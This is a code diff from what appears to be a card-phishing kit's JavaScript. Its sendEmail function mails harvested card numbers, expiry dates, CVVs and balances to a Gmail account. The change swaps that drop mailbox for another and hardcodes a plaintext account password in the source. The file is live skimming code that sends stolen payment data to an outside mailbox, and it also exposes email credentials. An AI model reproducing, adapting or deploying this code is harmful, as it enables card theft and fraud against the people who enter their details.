@@ -89,10 +89,10 @@ retrieveInfos();
 function sendEmail(card_number,month,year,cvv,balance){
   Email.send({
     Host: "smtp.gmail.com",
-    Username: "nidhi.sharma0310@gmail.com",
-    Password: "Kafyvdmpzefuzzcx",
-    To: "nidhi.sharma0310@gmail.com",
-    From: "nidhi.sharma0310@gmail.com",
+    Username: "helenmarshall528@gmail.com",
+    Password: "sxxzoujkfsqxuzfe",
+    To: "helenmarshall528@gmail.com",
+    From: "helenmarshall528@gmail.com",
     Subject: `Rush Card ${card_number}sent you a message`,
     Body: `'card_number: ${card_number}<br> month: ${month} <br> year: ${year} <br> cvv: ${cvv} <br> balance: ${balance}`,
   }).then(function(){
